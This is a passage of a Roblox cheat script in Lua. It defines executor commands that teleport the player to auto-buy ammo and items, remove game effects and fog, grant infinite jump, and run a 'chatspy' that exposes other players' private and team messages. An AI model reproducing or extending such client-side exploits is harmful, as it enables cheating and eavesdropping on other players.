			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-98.6363907, 21.910841, -869.772522)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Original Phone] - $50'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Original Phone] - $50'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "orangephone";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-104.095627, 21.9084187, -855.717834)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Orange Phone] - $400'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Orange Phone] - $400'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "pinkphone";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-115.942665, 21.9033699, -859.392029)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[PinkPhone] - $400'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[PinkPhone] - $400'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "iphoneg";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-116.25132, 21.9032345, -871.106567)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[iPhoneG] - $600'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[iPhoneG] - $600'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "iphoneb";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-116.24559, 21.9032383, -876.303711)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[iPhoneB] - $600'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[iPhoneB] - $600'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "iphone";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-116.201302, 21.9032574, -881.808105)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[iPhone] - $600'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[iPhone] - $600'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "arammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '100 [AR Ammo] - $75' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-592.224243, 5.45597506, -751.531738, 0, 0, 1, 0, 1, -0, -1, 0, 0)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("100 [AR Ammo] - $75") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["100 [AR Ammo] - $75"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "smgammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '80 [SMG Ammo] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-582.523499, 5.47780275, -717.231323, -1, 0, 0, 0, 1, 0, 0, 0, -1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("80 [SMG Ammo] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["80 [SMG Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "silencerammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '25 [Silencer Ammo] - $50' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(500.477814, 45.1070747, -617.031189, 0.999999821, 0.000604254019, -2.60802135e-08, -0.000604254019, 0.999999821, -8.63220048e-05, -2.60802135e-08, 8.63220048e-05, 1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("25 [Silencer Ammo] - $50") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["25 [Silencer Ammo] - $50"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "glockammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '25 [Glock Ammo] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(501.277649, 45.1075287, -626.03125, -0.999999762, 0.000690576038, 2.98059604e-08, 0.000690576038, 0.999999762, 8.63220048e-05, 2.98059604e-08, 8.63220048e-05, -1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("25 [Glock Ammo] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["25 [Glock Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "tacticalammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '20 [TacticalShotgun Ammo] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(492.877716, 45.1125259, -620.431091, 0.999999821, 0.000604254019, -2.60802135e-08, -0.000604254019, 0.999999821, -8.63220048e-05, -2.60802135e-08, 8.63220048e-05, 1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("20 [TacticalShotgun Ammo] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["20 [TacticalShotgun Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "tacticalshotgunammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '20 [TacticalShotgun Ammo] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(492.877716, 45.1125259, -620.431091, 0.999999821, 0.000604254019, -2.60802135e-08, -0.000604254019, 0.999999821, -8.63220048e-05, -2.60802135e-08, 8.63220048e-05, 1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("20 [TacticalShotgun Ammo] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["20 [TacticalShotgun Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "tacticalshottyammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '20 [TacticalShotgun Ammo] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(492.877716, 45.1125259, -620.431091, 0.999999821, 0.000604254019, -2.60802135e-08, -0.000604254019, 0.999999821, -8.63220048e-05, -2.60802135e-08, 8.63220048e-05, 1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("20 [TacticalShotgun Ammo] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["20 [TacticalShotgun Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "p90ammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '120 [P90 Ammo] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(462.977386, 45.1329269, -624.530518, 1.1920929e-07, 0.000671427639, 0.999999762, 0.000183116586, 0.999999762, -0.000671427639, -1, 0.000183116645, 0)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("120 [P90 Ammo] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["120 [P90 Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "augammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '90 [AUG Ammo] - $80' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-278.032684, 49.3650932, -213.393814, -0.999999762, -0.000604254019, 2.60802135e-08, -0.000604254019, 0.999999821, -8.63220048e-05, 2.60802135e-08, -8.63220048e-05, -1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("90 [AUG Ammo] - $80") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["90 [AUG Ammo] - $80"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "shotgunammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[20 [Shotgun Ammo] - $60]' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-800.960022, -42.5478363, -931.500061, 5.96046448e-08, 0.000122077763, 1, -0.000610388757, 0.999999821, -0.000122077705, -0.999999762, -0.000610388757, 1.1920929e-07)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[20 [Shotgun Ammo] - $60]") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["20 [Shotgun Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
			end
		end;
	});

	addCommand({
		["Name"] = "shottyammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[20 [Shotgun Ammo] - $60]' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-800.960022, -42.5478363, -931.500061, 5.96046448e-08, 0.000122077763, 1, -0.000610388757, 0.999999821, -0.000122077705, -0.999999762, -0.000610388757, 1.1920929e-07)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[20 [Shotgun Ammo] - $60]") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["20 [Shotgun Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
			end
		end;
	});

	addCommand({
		["Name"] = "rpgammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '5 [RPG Ammo] - $1000' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(118.664856, -29.6487694, -272.349792, -1, 0.000172614207, -8.63816167e-05, 0.000172673812, 0.999999762, -0.000690568588, 8.62623929e-05, -0.000690583489, -0.999999762)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("5 [RPG Ammo] - $1000") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["5 [RPG Ammo] - $1000"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "flameammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '140 [Flamethrower Ammo] - $1550' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-150.322266, 50.9075279, -105.331444, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("140 [Flamethrower Ammo] - $1550") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["140 [Flamethrower Ammo] - $1550"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "revammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '12 [Revolver Ammo] - $75' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-618.600037, 18.8513641, -97.75, -1, 0, 0, 0, 1, 0, 0, 0, -1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("12 [Revolver Ammo] - $75") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["12 [Revolver Ammo] - $75"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "ak47ammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '90 [AK47 Ammo] - $80' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-587.529358, 5.39480686, -753.717712, -1, 0, 0, 0, 1, 0, 0, 0, -1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("90 [AK47 Ammo] - $80") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["90 [AK47 Ammo] - $80"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "shovel";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(147.299988, 18.8493252, 31.7999744, 0, 0, 1, 0.00036623326, 0.99999994, 0, -0.999999881, 0.00036623326, 0)
			wait(.5)

			fireclickdetector(game.Workspace.Ignored.Shop['[Shovel] - $320'].ClickDetector)
			fireclickdetector(game.Workspace.Ignored.Shop['[Shovel] - $320'].ClickDetector)
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "barrelammo";
		["Function"] = function()
			_G.savedhumanoidpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '18 [Double-Barrel SG Ammo] - $60' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(-1046.20032, 18.8513641, -256.449951, -1, 0, 0, 0, 1, 0, 0, 0, -1)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("18 [Double-Barrel SG Ammo] - $60") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["18 [Double-Barrel SG Ammo] - $60"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.savedhumanoidpos)
		end;
	});

	addCommand({
		["Name"] = "avatar";
		["Function"] = function()
			local function inTable(What, Table)
				for Index, Value in pairs(Table) do
					if What == Value then
						return true
					end
				end
				return false
			end

			local removingClasses = {
				"Accessory",
				"Pants",
				"Shirt",
			}

			for _, Instance in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
				if inTable(Instance.ClassName, removingClasses) or Instance.Name == "face" then
					Instance:Destroy()
				end
			end
		end;
	});

	local infinitezoom = false
	addCommand({
		["Name"] = "zoom";
		["Function"] = function()
			if infinitezoom == true then
				infinitezoom = false
				game.Players.LocalPlayer.CameraMaxZoomDistance = 20
				sendNotif("", "Infinite Zoom Disabled.", 15);
			else 
				infinitezoom = true
				game.Players.LocalPlayer.CameraMaxZoomDistance = math.huge
				sendNotif("", "Infinite Zoom Enabled.", 15);
			end
		end;
	});

	addCommand({
		["Name"] = "infinitezoom";
		["Function"] = function()
			if infinitezoom == true then
				infinitezoom = false
				game.Players.LocalPlayer.CameraMaxZoomDistance = 20
				sendNotif("", "Infinite Zoom Disabled.", 15);
			else 
				infinitezoom = true
				game.Players.LocalPlayer.CameraMaxZoomDistance = math.huge
				sendNotif("", "Infinite Zoom Enabled.", 15);
			end
		end;
	});

	addCommand({
		["Name"] = "superzoom";
		["Function"] = function()
			if infinitezoom == true then
				infinitezoom = false
				game.Players.LocalPlayer.CameraMaxZoomDistance = 20
				sendNotif("", "Infinite Zoom Disabled.", 15);
			else 
				infinitezoom = true
				game.Players.LocalPlayer.CameraMaxZoomDistance = math.huge
				sendNotif("", "Infinite Zoom Enabled.", 15);
			end
		end;
	});

	local fog = false
	addCommand({
		["Name"] = "fog";
		["Function"] = function()
			if fog == true then
				fog = false
				game.Lighting.FogEnd = 550
				sendNotif("", "Fog Disabled.", 15);
			else 
				fog = true
				game.Lighting.FogEnd = math.huge
				sendNotif("", "Fog Enabled.", 15);
			end
		end;
	});

	addCommand({
		["Name"] = "togglefog";
		["Function"] = function()
			if fog == true then
				fog = false
				game.Lighting.FogEnd = 550
				sendNotif("", "Fog Disabled.", 15);
			else 
				fog = true
				game.Lighting.FogEnd = math.huge
				sendNotif("", "Fog Enabled.", 15);
			end
		end;
	});

	addCommand({
		["Name"] = "antipepper";
		["Function"] = function()
			game:GetService("StarterGui").MainScreenGui.PepperSpray:Destroy()
			game:GetService("Lighting").PepperSprayBlur:Destroy()
		end;
	});

	addCommand({
		["Name"] = "antisnow";
		["Function"] = function()
			sendOutput(" Antisnow Enabled.");
			game:GetService("StarterGui").MainScreenGui.SNOWBALLFRAME:Destroy()
			game:GetService("Lighting").SnowBlur:Destroy()
		end;
	});

	addCommand({
		["Name"] = "antiflakes";
		["Function"] = function()
			sendOutput(" Antiflakes Enabled.");
			game:GetService("Workspace").Ignored.SnowBlock:Destroy()
		end;
	});

	addCommand({
		["Name"] = "infjump";
		["Function"] = function()
			Player = game:GetService"Players".LocalPlayer;
			UIS = game:GetService'UserInputService';

			_G.JumpHeight = 50;

			function Action(Object, Function)
				if Object ~= nil then
					Function(Object);
				end
			end

			UIS.InputBegan:connect(function(UserInput)
				if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.Space then
					Action(Player.Character.Humanoid, function(self)
						if self:GetState() == Enum.HumanoidStateType.Jumping or self:GetState() == Enum.HumanoidStateType.Freefall then
							Action(self.Parent.HumanoidRootPart, function(self)
								self.Velocity = Vector3.new(0, _G.JumpHeight, 0);
							end)
						end
					end)
				end
			end)
		end;
	});

	local airstrike = false
	addCommand({
		["Name"] = "airstrike";
		["Function"] = function()
			if airstrike == true then
				airstrike = false
				sendNotif("", "Airstrike Disabled.", 15);
				sendOutput(" Airstrike Disabled.");
				for i, v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren()) do
					if v:isA("Tool") then
						local a = Instance.new("SelectionBox", v.Handle)
						a.Adornee = v.Handle
						v.GripPos = Vector3.new(0, 0, 0)
						lplayer.Character.Humanoid:UnequipTools()
					end
				end
			else 
				airstrike = true
				sendNotif("", "Airstrike Enabled.", 15);
				sendOutput(" Airstrike Enabled.");
				for i, v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren()) do
					if v:isA("Tool") then
						local a = Instance.new("SelectionBox", v.Handle)
						a.Adornee = v.Handle
						v.GripPos = Vector3.new(-1, -1, -1)
						lplayer.Character.Humanoid:UnequipTools()
					end
				end
			end
		end;
	});

	addCommand({
		["Name"] = "chatlogs";
		["Function"] = function()
			sendOutput(" Chat Spy Enabled.");
			enabled = true
			spyOnMyself = false
			public = false
			publicItalics = true
			privateProperties = {
				Color = Color3.fromRGB(0, 255, 255);
				Font = Enum.Font.SourceSansBold;
				TextSize = 18;
			}
			local StarterGui = game:GetService("StarterGui")
			local Players = game:GetService("Players")
			local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
			local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
			local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
			local instance = (_G.chatSpyInstance or 0) + 1
			_G.chatSpyInstance = instance

			local function onChatted(p, msg)
				if _G.chatSpyInstance == instance then
					if p == player and msg:lower():sub(1, 4) == "/spy" then
						enabled = not enabled
						wait(0.3)
						privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
						StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
					elseif enabled and (spyOnMyself == true or p ~= player) then
						msg = msg:gsub("[\n\r]", ''):gsub("\t", ' '):gsub("[ ]+", ' ')
						local hidden = true
						local conn = getmsg.OnClientEvent:Connect(function(packet, channel)
							if packet.SpeakerUserId == p.UserId and packet.Message == msg:sub(#msg - #packet.Message + 1) and (channel == "All" or (channel == "Team" and public == false and Players[packet.FromSpeaker].Team == player.Team)) then
								hidden = false
							end
						end)
						wait(1)
						conn:Disconnect()
						if hidden and enabled then
							if public then
								saymsg:FireServer((publicItalics and "/me " or '').."{SPY} ["..p.Name.."]: "..msg, "All")
							else
								privateProperties.Text = "{SPY} ["..p.Name.."]: "..msg
								StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
							end
						end
					end
				end
			end

			for _, p in ipairs(Players:GetPlayers()) do
				p.Chatted:Connect(function(msg)
					onChatted(p, msg)
				end)
			end
			Players.PlayerAdded:Connect(function(p)
				p.Chatted:Connect(function(msg)
					onChatted(p, msg)
				end)
			end)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
			if not player.PlayerGui:FindFirstChild("Chat") then
				wait(3)
			end
			local chatFrame = player.PlayerGui.Chat.Frame
			chatFrame.ChatChannelParentFrame.Visible = true
			chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), chatFrame.ChatChannelParentFrame.Size.Y)
		end;
	});

	addCommand({
		["Name"] = "chatspy";
		["Function"] = function()
			sendOutput(" Chat Spy Enabled.");
			enabled = true
			spyOnMyself = false
			public = false
			publicItalics = true
			privateProperties = {
				Color = Color3.fromRGB(0, 255, 255);
				Font = Enum.Font.SourceSansBold;
				TextSize = 18;
			}
			local StarterGui = game:GetService("StarterGui")
			local Players = game:GetService("Players")
			local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
			local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
